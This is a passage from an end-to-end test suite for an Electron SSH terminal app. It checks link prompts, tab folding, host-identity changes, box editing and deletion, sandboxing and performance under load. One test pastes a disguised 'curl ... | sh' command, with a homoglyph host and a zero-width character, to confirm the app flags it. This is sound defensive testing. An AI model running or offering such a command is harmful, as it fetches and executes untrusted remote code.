        // An address the box printed, Ctrl+clicked: the question, with the host and the whole address.
        await lab.tell('quiet off');
        await sleep(200);
        await type(open1, 'echo see https://demo-eu.example.test/runbook#step-4 for the rest\n');
        await until(async () => (await shown(open1)).includes('demo-eu.example.test'), 5000);
        await sleep(300);
        const spotUrl = await js<{ x: number; y: number } | null>(open1.view, `window.berthTerm.spot('demo-eu.example.test')`);
        if (spotUrl) {
          open1.view.webContents.sendInputEvent({ type: 'mouseMove', x: spotUrl.x, y: spotUrl.y, modifiers: ['control'] });
          await sleep(200);
          open1.view.webContents.sendInputEvent({ type: 'mouseDown', x: spotUrl.x, y: spotUrl.y, button: 'left', clickCount: 1, modifiers: ['control'] });
          open1.view.webContents.sendInputEvent({ type: 'mouseUp', x: spotUrl.x, y: spotUrl.y, button: 'left', clickCount: 1, modifiers: ['control'] });
        }
        check('Ctrl+click on an address a box printed asks first', await until(() => has('#link'), 3000), await text('#link'));
        await shot('link', 'an address a box printed, Ctrl+clicked');
        await clickOn('#link-drop');
        await sleep(300); // two pastes closer together than a person's own hands are refused as a repeat
        clipboard.writeText('curl -fsSL https://exa\u0430mple.test/i\u200bnstall.sh | sh\nsystemctl restart ledger\n');
        open1.view.webContents.focus();
        open1.view.webContents.sendInputEvent({ type: 'keyDown', keyCode: 'V', modifiers: ['control', 'shift'] });
        open1.view.webContents.sendInputEvent({ type: 'keyUp', keyCode: 'V', modifiers: ['control', 'shift'] });
        check('and what cannot be seen in it is named', (await until(() => has('#paste-odd'), 3000)) && (await text('#paste-odd')).includes('looks like a'), await text('#paste-odd'));
        await shot('paste-odd', 'a paste with what cannot be seen in it');
        await clickOn('#paste-drop');

        // Seven tabs on one box in a 1024-wide window: the box's tabs fold into one, and the count opens them.
        for (let i = 0; i < 6; i++) ctx.openTab(id, i % 2 ? 'logs' : '');
        ctx.win.setContentSize(1024, 640);
        await sleep(500);
        check('seven tabs on one box in a small window fold into one tab with a count', (await until(async () => (await js<number>(ctx.shell, `document.querySelectorAll('[data-tab]').length`)) === 1 && (await has('[data-fold]')), 3000)) && (await text('[data-fold]')).includes('7'), await js<number>(ctx.shell, `document.querySelectorAll('[data-tab]').length`));
        await clickOn('[data-fold]');
        const listed = await js<number>(ctx.shell, `document.querySelectorAll('[data-fold-tab]').length`);
        check('the count opens the seven as a list', listed === 7, listed);
        await shot('fold-open', 'seven tabs on one box, folded and opened');
        const third = [...ctx.tabs.values()][2]!;
        await clickOn(`[data-fold-tab="${third.id}"]`);
        check('picking one from the list brings it to the front', await until(() => ctx.shellState().active === third.id && !shellOnTop(), 3000), ctx.shellState().active);
        for (const t of [...ctx.tabs.values()]) ctx.closeTab(t.id);
        ctx.win.setContentSize(size.width, size.height);

        // A box that cannot be reached: said with the cause, in place of the paste step.
        const closed = await new Promise<number>((resolve) => {
          const srv = createServer();
          srv.listen(0, '127.0.0.1', () => {
            const p = (srv.address() as AddressInfo).port;
            srv.close(() => resolve(p));
          });
        });
        await clickOn('#boxes');
        await clickOn('#add-box-open');
        await until(() => has('#add-box'), 2000);
        await clickOn('#box-name');
        await typeKeys('quiet-box');
        await clickOn('#box-host');
        await typeKeys('127.0.0.1');
        await clickOn('#box-port');
        await typeKeys(String(closed));
        await clickOn('#box-user');
        await typeKeys('demo');
        await pressEnter();
        check('a box nothing answers at: the check says it was refused, with Try again', (await until(async () => (await step()) === 'unreachable', 15_000)) && (await text('#check-unreachable')).includes('refused the connection') && (await has('#check-again')), await text('#check-unreachable'));
        await shot('check-unreachable', 'the first-connection check, the box cannot be reached');
        await clickOn('#check-close');
        check('Close: no dialog, the box is kept, never checked', (await until(async () => !(await has('#check')), 2000)) && ctx.boxes.list.find((b) => b.name === 'quiet-box')?.pin === '', '');
        check('no tab open, boxes saved: the window offers each of them, and Add box', await until(async () => (await has('[data-open="lab-box"]')) && (await has('[data-open="quiet-box"]')) && (await has('#first-add')), 2000), await text('#first-use'));
        await shot('no-tab', 'no tab open, two boxes saved');
        await clickOn('#boxes');
        await until(() => has('#box-menu'), 2000);
        await shot('boxes-unchecked', 'the Boxes menu, a box not checked yet');
        await clickOn('[data-box="quiet-box"]');
        check('a box never checked, picked from Boxes, opens its check and no tab', (await until(() => has('#check'), 3000)) && ctx.shellState().tabs.length === 0, '');
        await clickOn('#check-close');

        // Another identity at the box's address: the tab stops, and the stop is said in its dialog.
        const rekeyed = await lab.tell('rekey');
        const printedNow = String(rekeyed['printed'] ?? ''); // the box's identity from here on: it was rebuilt
        ctx.openTab(id, '');
        check('a box showing another identity: the tab stops and the dialog says so, with both fingerprints', (await until(() => has('#changed'), 20_000)) && (await text('#changed')).includes(ctx.boxes.list[0]!.pinFingerprint) && (await until(shellOnTop, 1000)), [await has('#changed'), await text('#changed'), shellOnTop(), ctx.shellState().tabs.map((t) => [t.link.phase, t.link.cause]), ctx.shellState().check?.boxId ?? '', ctx.boxes.list.map((b) => [b.name, b.pinFingerprint])]);
        await shot('changed', 'a box whose identity changed');
        {
          const stopped = [...ctx.tabs.values()].find((x) => x.engine.link.cause === 'identity-changed');
          const pidThen = stopped?.engine.pid;
          await sleep(1200);
          check('and no new session is opened after a changed identity either', !!stopped && stopped.againAt === 0 && stopped.engine.pid === pidThen, [stopped?.againAt, stopped?.engine.pid === pidThen]);
        }
        await clickOn('#changed-close');
        check('Close: the dialog goes, the tab stays, marked stopped', (await until(async () => !(await has('#changed')), 2000)) && (await js<string>(ctx.shell, `document.querySelector('[data-tab]')?.dataset.state ?? ''`)) === 'stopped', '');

        // ---- Edit box and Delete box, driven by hand from the Boxes menu. ----
        await clickOn('#boxes');
        await until(() => has('#box-menu'), 2000);
        await moveTo('[data-box="lab-box"]');
        check('each box in the menu carries Edit and Delete of its own', (await has('[data-edit="lab-box"]')) && (await has('[data-remove="lab-box"]')), '');
        await clickOn('[data-edit="lab-box"]');
        const openedEdit = await until(() => has('#add-box'), 2000);
        const editSaid = await text('#add-box');
        check('Edit opens the box as it stands: the same fields, its own values, its key kept and its identity shown', openedEdit && editSaid.includes('Edit lab-box') && editSaid.includes('This box keeps the key Berth made for it') && (await has('#edit-pinned')) && (await text('#edit-pinned')).includes(ctx.boxes.list[0]!.pinFingerprint), [editSaid.slice(0, 120), await text('#edit-pinned')]);
        await shot('edit-box', 'Edit box, with the identity it is pinned to');
        // The name is changed to one already taken: refused by name, and nothing is saved.
        const nameField = '#box-name';
        const pickAll = async (sel: string) => js(ctx.shell, `(() => { const i = document.querySelector(${JSON.stringify(sel)}); if (!i) return 'no field'; i.focus(); i.setSelectionRange(0, i.value.length); return 'ok'; })()`);
        check('the name field is there to change', (await pickAll(nameField)) === 'ok', await js(ctx.shell, `[...document.querySelectorAll('#add-box input')].map((i) => i.id || i.name || i.placeholder).join(',')`));
        await typeKeys('quiet-box');
        await sleep(200);
        check('a name another box has is refused as you type, and Save is held back', (await text('#add-box')).includes('taken') || (await has('#add-to-fix')), await text('#add-box'));
        await pickAll(nameField);
        await typeKeys('lab-box-renamed');
        await sleep(150);
        await clickOn('#add-submit');
        const renamed = await until(() => ctx.boxes.list.some((b) => b.name === 'lab-box-renamed'), 4000);
        const box0 = () => ctx.boxes.list.find((b) => b.id === id)!;
        check('Save writes what changed, keeps the key and the identity, and the window says so', renamed && box0().publicKey !== '' && box0().pin !== '' && (await text('#status-done')).includes('Saved'), [box0().name, box0().pin !== '', await text('#status-done')]);
        check('and the tabs open on it say its new name', await until(async () => (await text('[data-tab]')).includes('lab-box-renamed'), 2000), await text('[data-tab]'));

        // Forget the identity: a box that was rebuilt is checked again, and cannot be opened until it is.
        await clickOn('#boxes');
        await moveTo('[data-box="lab-box-renamed"]');
        await clickOn('[data-edit="lab-box-renamed"]');
        await until(() => has('#add-box'), 2000);
        await clickOn('#edit-forget');
        const forgot = await until(() => ctx.boxes.list.find((b) => b.id === id)?.pin === '', 4000);
        check('Forget it: the identity pinned for the box goes, and nothing else about it changes', forgot && box0().name === 'lab-box-renamed' && box0().publicKey !== '' && (await has('#edit-unpinned')), [box0().pin, box0().publicKey !== '']);
        await clickOn('#add-cancel');
        check('and a box with no identity cannot be opened: picking it opens its check instead', ctx.openTab(id) === null, '');
        // Pinned again, the straight way: the check, with the box's own lines.
        await clickOn('#boxes');
        const menuThere = await until(() => has('[data-box="lab-box-renamed"]'), 2000);
        await clickOn('[data-box="lab-box-renamed"]');
        const checkThere = await until(() => has('#check'), 3000);
        check('a box whose identity was forgotten opens its check, not a tab', menuThere && checkThere, [menuThere, checkThere, await text('#box-menu')]);
        await clickOn('#check-paste');
        await typeKeys(printedNow.trim()); // the box was rebuilt earlier in this run: these are its lines now
        const matched = await until(async () => (await step()) === 'match', 4000);
        check('its new lines are a match, and only then may it be trusted', matched && (await has('#check-trust')), await step());
        await clickOn('#check-trust');
        check('checked again, it is pinned again and opens', await until(() => box0().pin !== '' && [...ctx.tabs.values()].some((t) => t.box?.id === id), 20_000), box0().pin.slice(0, 20));

        // Delete box: what goes is named before anything happens, and Keep it changes nothing.
        await clickOn('#boxes');
        await moveTo('[data-box="lab-box-renamed"]');
        await clickOn('[data-remove="lab-box-renamed"]');
        const askedRemove = await until(() => has('#remove-box'), 2000);
        const goes = await text('#remove-goes');
        check('Delete asks first, naming what goes: the box, its key, its pinned identity, and the tabs open on it', askedRemove && goes.includes('lab-box-renamed') && goes.includes('its key') && goes.includes('the identity pinned for it') && /\d+ open tabs? on it/.test(goes), goes);
        check('and it says what stays on the box itself', (await text('#remove-stays')).includes('only the box can take it out'), await text('#remove-stays'));
        check('the way out has the focus, so Enter keeps the box', (await js<string>(ctx.shell, `document.activeElement?.id ?? ''`)) === 'remove-cancel', await js<string>(ctx.shell, `document.activeElement?.id ?? ''`));
        await shot('remove-box', 'Delete box: what goes with it');
        await clickOn('#remove-cancel');
        check('Keep it: the box, its key and its tabs are all still there', (await until(async () => !(await has('#remove-box')), 2000)) && ctx.boxes.list.some((b) => b.id === id) && [...ctx.tabs.values()].some((t) => t.box?.id === id), '');
        // And deleted for real: the box, its key and its tabs go together.
        await clickOn('#boxes');
        await moveTo('[data-box="lab-box-renamed"]');
        await clickOn('[data-remove="lab-box-renamed"]');
        await until(() => has('#remove-box'), 2000);
        await clickOn('#remove-do');
        await until(async () => !ctx.boxes.list.some((b) => b.id === id), 5000);
        const held = await ctx.keys.request('keys');
        // Each of the four is worked out on its own, so that a failure says which one did not hold rather than
        // leaving the next person to guess from a list of everything.
        const wentBox = !ctx.boxes.list.some((b) => b.id === id);
        const wentKey = Array.isArray(held['keys']) && !(held['keys'] as Record<string, unknown>[]).some((k) => k['box'] === id);
        const wentTabs = ![...ctx.tabs.values()].some((t) => t.box?.id === id);
        const said = (await text('#status-done')).includes('Deleted lab-box-renamed');
        check('Delete: the box, its key and its tabs go together, and the window says so', wentBox && wentKey && wentTabs && said, [{ wentBox, wentKey, wentTabs, said }, ctx.boxes.list.map((b) => b.name), held['keys'], await text('#status-done')]);

        lab.end();
      }
      canary.close();
      clearTimeout(guard);
      return finish(results.every((r) => r.ok) ? 0 : 1);
    }

    // The short mode, for a package whose engine file was changed on purpose: one tab, and its engine must be
    // refused with the reason. Nothing else is probed, because nothing else can work without an engine.
    if (ctx.mode === 'engine-must-be-refused') {
      const t = ctx.openTab()!;
      await until(() => t.engine.state === 'gone', 10_000);
      check('the engine was not started', t.engine.state === 'gone' && t.engine.pid === 0, [t.engine.state, t.engine.pid]);
      check('and the tab says why', t.engine.cause === 'the engine file is not the one this app was built with', t.engine.cause);
      // The key process is the same program file: it is refused the same way, and the lock says so.
      await until(() => ctx.gate.state.phase === 'fault', 10_000);
      check('the key process was not started either, and the lock says why', ctx.gate.state.phase === 'fault' && ctx.keys.pid === 0 && ctx.gate.state.detail.includes('not the one this app was built with'), [ctx.gate.state.phase, ctx.gate.state.detail]);
      canary.close();
      clearTimeout(guard);
      return finish(results.every((r) => r.ok) ? 0 : 1);
    }

    // "picture": the whole window as one picture, from the real app. Three tabs, the second one in front.
    // SSHAPP_PICTURE=<file.png> says where it goes; SSHAPP_PICTURE_STRIP is the text of the strip that names it.
    if (ctx.mode === 'picture') {
      const file = process.env['SSHAPP_PICTURE'] ?? '';
      const tabs3 = [ctx.openTab()!, ctx.openTab()!, ctx.openTab()!];
      await until(() => tabs3.every((t) => t.engine.state === 'ready'), 15_000);
      await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${tabs3[1]!.id} })`);
      await type(tabs3[1]!, 'this text went to the tab\'s own engine and came back');
      await until(async () => (await shown(tabs3[1]!)).includes('came back'), 3000);
      await sleep(400);
      const size = ctx.win.getContentBounds();
      const made = await takePicture({ win: ctx.win, views: [ctx.shell, tabs3[1]!.view], file, strip: process.env['SSHAPP_PICTURE_STRIP'] ?? '', dist: ctx.dist, harden: ctx.harden });
      check(`a picture of the whole window: ${made.width} x ${made.height} pixels at scale ${made.scale}`, file !== '' && made.width === Math.round(size.width * made.scale), made);
      canary.close();
      clearTimeout(guard);
      return finish(results.every((r) => r.ok) ? 0 : 1);
    }

    // "direction": one of the direction pictures. A sealed view fills the window with the directions page, in
    // the direction and scene asked for, and the whole window is pictured once its typefaces have loaded.
    if (ctx.mode === 'direction') {
      const file = process.env['SSHAPP_PICTURE'] ?? '';
      const which = /^[abc]$/.test(process.env['SSHAPP_DIRECTION'] ?? '') ? process.env['SSHAPP_DIRECTION'] : 'a';
      const scene = /^(dialog|paths|boxes|logs|plain|create|unlock|wrong|addbox|trust|changed|connecting|fresh|noanswer|dropped|mismatch|unreachable|seven|sevenopen)$/.test(process.env['SSHAPP_SCENE'] ?? '') ? process.env['SSHAPP_SCENE'] : 'plain';
      const view = ctx.newView('directions');
      const size = ctx.win.getContentBounds();
      view.setBounds({ x: 0, y: 0, width: size.width, height: size.height });
      ctx.win.contentView.addChildView(view);
      await view.webContents.loadURL(`app://directions/index.html?d=${which}&scene=${scene}`);
      const fonts = await js<string>(view, `document.fonts.ready.then(() => [...document.fonts].filter((f) => f.status === 'loaded').length + ' of ' + document.fonts.size)`);
      const drawn = await js<boolean>(view, `document.documentElement.classList.contains('drawn')`);
      await sleep(500);
      const made = await takePicture({ win: ctx.win, views: [view], file, strip: process.env['SSHAPP_PICTURE_STRIP'] ?? '', dist: ctx.dist, harden: ctx.harden });
      check(`direction ${which}, ${scene}: drawn, typefaces loaded ${fonts}, ${made.width} x ${made.height}`, drawn && file !== '' && !fonts.startsWith('0 '), { fonts, made });
      canary.close();
      clearTimeout(guard);
      return finish(results.every((r) => r.ok) ? 0 : 1);
    }

    // "hold": two tabs, then nothing. Prints who is who and stays up, so the script outside can end main by
    // force and see that the engines end with it (children never outlive their parent).
    if (ctx.mode === 'hold') {
      const one = ctx.openTab()!;
      const two = ctx.openTab()!;
      const up = (await until(() => one.engine.state === 'ready' && two.engine.state === 'ready', 15_000)) && ctx.keys.pid > 1;
      process.stdout.write(`HOLD ok=${up} main=${process.pid} engines=${one.engine.pid},${two.engine.pid},${ctx.keys.pid}\n`);
      canary.close();
      clearTimeout(guard);
      return;
    }

    // "seven": the fullest day. Seven tabs on a box, each with its own view, engine and SSH link, all answering,
    // none leaking into another; flooded all at once while the window is used; with what it costs in memory.
    // The box is the lab's own SSH server: its sessions print as fast as each link takes it, so every byte is
    // encrypted, carried, held to the fixed amount a box may be ahead, and drawn by a real terminal.
    if (ctx.mode === 'seven') {
      const labBin = process.env['SSHAPP_LABBOX'] ?? '';
      if (labBin === '') {
        check('a lab box to connect to', false, 'SSHAPP_LABBOX is not set: the seven tabs need the lab\'s SSH server');
        canary.close();
        clearTimeout(guard);
        return finish(1);
      }
      // Three boxes: four tabs on one, two on another, one on the last, as a full day has it.
      const labs: LabBox[] = [];
      const boxIds: string[] = [];
      for (const [n, name] of ['lab-box', 'lab-two', 'lab-three'].entries()) {
        const { box: lab, first } = await LabBox.start(labBin);
        const added = await ctx.boxes.add({ name, colour: n + 2, host: '127.0.0.1', port: String(first['addr'] ?? '').split(':')[1] ?? '', user: 'demo', folder: '', places: [] });
        const boxId = added.ok ? added.id : '';
        ctx.boxes.reach(boxId);
        await until(() => ctx.boxes.check(boxId).step === 'reached', 20_000);
        ctx.boxes.paste(boxId, String(first['printed'] ?? ''));
        const trusted = await ctx.boxes.trust(boxId);
        await lab.tell(`accept ${ctx.boxes.get(boxId)?.publicKey ?? ''}`);
        check(`${name} is added, checked and pinned`, added.ok && trusted.ok, [added, trusted]);
        labs.push(lab);
        boxIds.push(boxId);
      }
      const everyLab = async (line: string, key: string): Promise<number> => {
        let sum = 0;
        for (const lab of labs) sum += Number((await lab.tell(line))[key] ?? 0);
        return sum;
      };
      const all = [0, 0, 0, 0, 1, 1, 2].map((n) => ctx.openTab(boxIds[n])!);
      check('seven links are up, each signed in', await until(() => all.every((t) => t.engine.link.phase === 'up'), 30_000), all.map((t) => t.engine.link.phase));
      for (const t of all) await until(async () => (await js<string>(t.view, `document.readyState`)) === 'complete', 10_000);
      const ids = [process.pid, ctx.shell.webContents.getOSProcessId(), ...all.map((t) => t.view.webContents.getOSProcessId()), ...all.map((t) => t.engine.pid)];
      check('sixteen processes, each its own', new Set(ids).size === 16 && !ids.includes(0), ids);
      for (const [i, t] of all.entries()) await type(t, `seven-${i}-x`);
      let leaks = 0;
      let arrived = 0;
      await sleep(300);
      for (const [i, t] of all.entries()) {
        const text = await until(async () => (await shown(t)).includes(`seven-${i}-x`), 3000) ? await shown(t) : '';
        if (text) arrived++;
        if (all.some((_, j) => j !== i && text.includes(`seven-${j}-x`))) leaks++;
      }
      check('each of the seven hears its own link only', arrived === 7 && leaks === 0, { arrived, leaks });
      // Every tab, and the button that opens one more, is in sight, whatever the window's width. A tab that has
      // slid out of the bar cannot be pressed, and what cannot be seen is not there (found 2026-11-16 on a
      // 1024-wide screen: tabs six and seven were past the window's edge).
      const inBar = await js<{ width: number; out: string[] }>(ctx.shell, `(() => { const w = window.innerWidth; const out = []; for (const el of document.querySelectorAll('[data-tab], [data-fold], #new')) { const r = el.getBoundingClientRect(); if (r.width < 1 || r.left < 0 || r.right > w + 0.5) out.push((el.getAttribute('data-tab') || el.id || 'fold') + ' ' + Math.round(r.left) + '-' + Math.round(r.right)); } return { width: w, out }; })()`);
      check(`every tab and the new-tab button are inside a bar ${inBar.width} wide`, inBar.out.length === 0, inBar);

      // The promises, measured under load: for four seconds every session on the box prints as fast as its link
      // takes it, while tabs are brought to the front one after another and real keys are typed into each.
      // Budgets are the plan's (B8), times the stated factor for slow test machines.
      const factor = Math.max(1, Number(process.env['SSHAPP_BUDGET_FACTOR']) || 1);
      const processors = availableParallelism();
      const paceOf = (t: Tab) => js<{ front: boolean; share: number; rested: number; taken: number; waiting: number }>(t.view, `window.berthTerm.pace()`);
      const takenAll = async () => {
        let sum = 0;
        for (const t of all) sum += (await paceOf(t)).taken;
        return sum;
      };
      const bringToFront = async (t: Tab) => {
        await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${t.id} })`);
        return until(() => ctx.shellState().active === t.id, 1000);
      };
      const pressAndType = async (t: Tab): Promise<boolean> => {
        // A box with several tabs in a narrow window folds them into one tab with a count: then the tab is
        // chosen the way the count's list chooses it. Otherwise by a real press on the tab itself.
        const at = await js<{ x: number; y: number } | null>(ctx.shell, `(() => { const b = document.querySelector('[data-tab="${t.id}"]'); if (!b) return null; const r = b.getBoundingClientRect(); return { x: Math.round(r.x + r.width / 2), y: Math.round(r.y + r.height / 2) }; })()`);
        if (at && ctx.shellState().active !== t.id) {
          ctx.shell.webContents.sendInputEvent({ type: 'mouseDown', x: at.x, y: at.y, button: 'left', clickCount: 1 });
          ctx.shell.webContents.sendInputEvent({ type: 'mouseUp', x: at.x, y: at.y, button: 'left', clickCount: 1 });
        } else if (!at) await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${t.id} })`);
        // The key follows the press at once, as a hand does, before the tab has been painted.
        t.view.webContents.focus();
        for (const type of ['keyDown', 'char', 'keyUp'] as const) t.view.webContents.sendInputEvent({ type, keyCode: 'k' });
        // A press counts only if the tab really came to the front: a press that landed nowhere measures nothing.
        return until(() => ctx.shellState().active === t.id, 1000);
      };
      const slowestSaid = (): string => {
        const slow = ctx.meter.slowest;
        return slow ? `${slow.kind} in ${slow.view === 0 ? 'the bar' : `tab ${slow.view}`}, ${slow.waitMs} ms before its handlers, ${slow.handlerMs} ms inside them, ${slow.paintMs} ms to the painted frame` : 'none over 16 ms';
      };
      await sleep(1200); // let start-up noise be reported, then begin clean

      // First with nothing printing: tabs brought to the front one after another, a key typed into each.
      ctx.meter.reset();
      let calmOk = 0;
      for (let i = 0; i < 12; i++) {
        const began = Date.now();
        if (await pressAndType(all[i % all.length]!)) calmOk++;
        await sleep(Math.max(0, 200 - (Date.now() - began)));
      }
      await sleep(1200); // the views report twice a second
      const calm = { ...ctx.meter.worst };
      check(`with nothing printing: a click or key was painted within ${calm.reactionMs} ms and a tab switch within ${calm.tabSwitchMs} ms (budget ${BUDGET.reactionMs} ms${factor > 1 ? `, times ${factor} on this machine` : ''}; slowest: ${slowestSaid()})`, calmOk === 12 && calm.reactionMs <= BUDGET.reactionMs * factor && calm.tabSwitchMs <= BUDGET.tabSwitchMs * factor && calm.tabSwitchMs > 0, { calmOk, calm });

      // Then one tab in front whose box prints as fast as the link takes it (a "yes", a huge file to the
      // screen), with keys typed into it all the while.
      const alone = all[6]!;
      await bringToFront(alone);
      await sleep(300);
      ctx.meter.reset();
      const aloneBefore = Number((await labs[2]!.tell('flooded'))['bytes'] ?? 0);
      await labs[2]!.tell('flood 3000');
      for (const until3 = Date.now() + 3000; Date.now() < until3; ) {
        for (const type of ['keyDown', 'char', 'keyUp'] as const) alone.view.webContents.sendInputEvent({ type, keyCode: 'k' });
        await sleep(150);
      }
      await until(() => alone.engine.waiting() === 0, 20_000);
      await sleep(1200);
      const flat = { ...ctx.meter.worst };
      const aloneRate = ((Number((await labs[2]!.tell('flooded'))['bytes'] ?? 0) - aloneBefore) / 1048576 / 3).toFixed(1);
      check(`one tab flooded as fast as its link takes it, ${aloneRate} MB/s: a key typed into it was painted within ${flat.reactionMs} ms (budget ${BUDGET.reactionMs} ms${factor > 1 ? `, times ${factor} on this machine` : ''}; slowest: ${slowestSaid()})`, Number(aloneRate) > 1 && flat.reactionMs > 0 && flat.reactionMs <= BUDGET.reactionMs * factor, flat);

      // Last, all seven at once.
      ctx.meter.reset();
      const FLOOD_MS = 4000;
      const PER_TAB = 2 * 1024 * 1024; // bytes a second each session prints: far more than a busy build's log
      const takenBefore = await takenAll();
      const floodedBefore = await everyLab('flooded', 'bytes');
      const flooding = await everyLab(`flood ${FLOOD_MS} ${PER_TAB}`, 'flooding');
      const until4 = Date.now() + FLOOD_MS;
      let turn = 0;
      let presses = 0;
      let switches = 0;
      while (Date.now() < until4) {
        const began = Date.now();
        presses++;
        if (await pressAndType(all[turn++ % all.length]!)) switches++;
        await sleep(Math.max(0, 200 - (Date.now() - began)));
      }
      const lowest = ctx.pace.lowest;
      // The flood is over when the box has stopped and every tab has worked through what it was sent.
      const drained = await until(async () => all.every((t) => t.engine.waiting() === 0) && (await Promise.all(all.map(paceOf))).every((p) => p.waiting === 0), 20_000);
      await sleep(1500); // the views report twice a second
      const flooded = (await everyLab('flooded', 'bytes')) - floodedBefore;
      const drawn = (await takenAll()) - takenBefore;
      const w = { ...ctx.meter.worst };
      const mbps = (flooded / 1048576 / (FLOOD_MS / 1000)).toFixed(1);
      check(`under load: ${switches} of ${presses} presses brought their tab to the front, ${mbps} MB/s from the box through seven links and terminals`, flooding === 7 && presses >= 7 && switches === presses && flooded > 1048576, { turn, presses, switches, flooded, flooding });
      // Nothing is lost on the way, held back or not: what the terminals worked through is what the box
      // printed, and the few keys it sent back.
      check('every byte the box printed was worked through by its terminal, and no more than the keys typed besides', drained && drawn >= flooded && drawn <= flooded + presses * 8, { drained, flooded, drawn, waiting: all.map((t) => t.engine.waiting()) });
      const rests = (await Promise.all(all.map(paceOf))).map((p) => p.rested);
      check(`the tab in front came first: with ${processors} processors, a flooded tab behind was allowed ${lowest === 1 ? 'all of its time' : `${Math.round(lowest * 100)} % of its time at the least`} (the rule allows ${Math.round(shareFor(processors, 6) * 100)} % with six flooded behind)`, lowest >= shareFor(processors, 6) && (lowest < 1 || rests.every((n) => n === 0)), { lowest, rests });
      // Seven terminals flooded at once need about one processor of their own, and the window, main, the
      // engines and the drawing need theirs. A machine with fewer than four processors cannot do both, and no
      // pacing can make it: there is no time to give. The promise is about a PC with processors to spare, so
      // this one case is allowed twice its budget on such a machine, said here in the probe's own words. The
      // two cases above (nothing printing, and one tab flooded as fast as its link takes it) are held to the
      // full budget on every machine, and they are the ones the promise is made of.
      const thin = processors < 4 ? 2 : 1;
      const thinSaid = thin > 1 ? `, and twice again with seven flooded on a machine with ${processors} processors` : '';
      const within = (key: keyof typeof BUDGET, what: string, mustMeasure: boolean) => {
        const limit = BUDGET[key] * factor * thin;
        check(`${what}: ${w[key]} ms (budget ${BUDGET[key]} ms${factor > 1 ? `, times ${factor} on this machine` : ''}${thinSaid})`, w[key] <= limit && (!mustMeasure || w[key] > 0), w);
      };
      within('mainDelayMs', 'main was never later than', true);
      within('viewTaskMs', 'no view was busy in one stretch longer than', false);
      // The slowest one also says where its time went: a slow reaction is explained, never guessed at.
      within('reactionMs', `a real click or key was painted within (slowest: ${slowestSaid()})`, false);
      within('tabSwitchMs', 'a tab switch was painted within', true);
      within('startMs', 'from process start to the first painted frame', true);

      // The rest itself, by hand: told a small share, a flooded tab behind works through far less than the tab
      // in front, which never rests; told the whole of its time, no tab rests at all.
      const frontTab = all[0]!;
      await bringToFront(frontTab);
      const behindTab = all[3]!;
      const measure = async (share: number) => {
        ctx.forcePace(share);
        await sleep(200);
        const before = [await paceOf(frontTab), await paceOf(behindTab)];
        await everyLab('flood 1500', 'flooding');
        await sleep(1500);
        const after = [await paceOf(frontTab), await paceOf(behindTab)];
        await until(async () => all.every((t) => t.engine.waiting() === 0), 20_000);
        return { front: after[0]!.taken - before[0]!.taken, behind: after[1]!.taken - before[1]!.taken, frontRested: after[0]!.rested - before[0]!.rested, behindRested: after[1]!.rested - before[1]!.rested };
      };
      const small = await measure(0.05);
      const whole = await measure(1);
      ctx.forcePace(null);
      check('told a small share, a flooded tab behind rests and works through far less than the tab in front, which never rests', small.behindRested > 0 && small.frontRested === 0 && small.behind * 3 < small.front, small);
      check('told the whole of its time, no tab rests', whole.behindRested === 0 && whole.frontRested === 0 && whole.behind > 0, whole);
      // What the memory number is worth depends on what the terminals are holding, so it is said with it:
      // the plan's figure is a tab with a real terminal and a full scrollback (30,000 lines), and the flood
      // above is what fills them. A number measured with empty terminals would mean nothing.
      const held = await Promise.all(all.map((t) => js<number>(t.view, `window.berthTerm.held()`)));
      const fullest = Math.max(...held);
      const leanest = Math.min(...held);
      check(`every terminal is holding a full scrollback before memory is measured: ${leanest} to ${fullest} lines of 30,000`, leanest >= 30_000, held);
      const mem = await memory(all.map((t) => t.engine.pid));
      for (const lab of labs) lab.end();
      const budget = 300 + 7 * 220;
      check(`memory with seven tabs, each holding ${leanest} lines: ${mem.fairMB} MB (${mem.how}); budget ${budget} MB; plain per-process sum ${mem.plainMB} MB`, mem.fairMB > 0 && mem.fairMB < budget, mem);
      canary.close();
      clearTimeout(guard);
      return finish(results.every((r) => r.ok) ? 0 : 1);
    }

    const a = ctx.openTab()!;
    const b = ctx.openTab()!;
    const views: [string, WebContentsView][] = [['shell', ctx.shell], ['tab a', a.view], ['tab b', b.view]];

    check('two engines answer', await until(() => a.engine.state === 'ready' && b.engine.state === 'ready', 10_000), [a.engine.state, b.engine.state, a.engine.cause]);
    await until(async () => (await js<string>(b.view, `document.readyState`)) === 'complete', 10_000);
    await until(async () => (await js<string>(a.view, `document.readyState`)) === 'complete', 10_000);

    // What a view is: no Node, sealed, its own process.
    for (const [name, v] of views) {
      const globals = await js<string>(v, `[typeof require, typeof process, typeof module, typeof Buffer, typeof global].join()`);
      check(`${name}: no Node in the page`, globals === 'undefined,undefined,undefined,undefined,undefined', globals);
      const sealed = await js<boolean>(v, `(window.tabPort ?? window.shellPort).sandboxed`);
      check(`${name}: sandboxed`, sealed === true, sealed);
      const port = await js<string>(v, `Object.keys(window.tabPort ?? window.shellPort).sort().join()`);
      check(`${name}: only its own port`, port === (name === 'shell' ? 'cmd,frame,gateCreate,gateForgetRestore,gatePickBackup,gatePickRestore,gateRestore,gateUnlock,gateUsePrevious,keyPassphrase,meter,onGate,onState,sandboxed' : 'copy,drag,files,frame,link,meter,onAgain,onBanner,onFilePage,onOutput,onPace,onPaste,onSettings,onShown,onState,pasteMode,reopen,resize,sandboxed,send,taken'), port);
    }
    const pids = [process.pid, ...views.map(([, v]) => v.webContents.getOSProcessId()), a.engine.pid, b.engine.pid];
    check('every view and engine is its own process', new Set(pids).size === pids.length && !pids.includes(0), pids);
    const partitions = views.map(([, v]) => v.webContents.session.storagePath ?? 'memory').concat(views.map(([, v]) => String(v.webContents.session === views[0]![1].webContents.session)));
    check('tab sessions are separate and in memory', a.view.webContents.session !== b.view.webContents.session && a.view.webContents.session !== ctx.shell.webContents.session && a.view.webContents.session.storagePath === null, partitions);

    // Bytes go to the tab's own engine and come back to that tab only.
    await type(a, 'alpha-7c1');
    check('a tab reaches its own engine', await until(async () => (await shown(a)).includes('alpha-7c1'), 3000), await shown(a));
    await sleep(200);
    check('another tab never sees it', !(await shown(b)).includes('alpha'), await shown(b));

    // A hidden tab is not slowed: b is the visible one, a is hidden.
    const t0 = Date.now();
    await type(a, 'hidden-2e9');
    const arrived = await until(async () => (await shown(a)).includes('hidden-2e9'), 3000);
    check('a hidden tab still receives', arrived && Date.now() - t0 < 1000, `${Date.now() - t0} ms`);
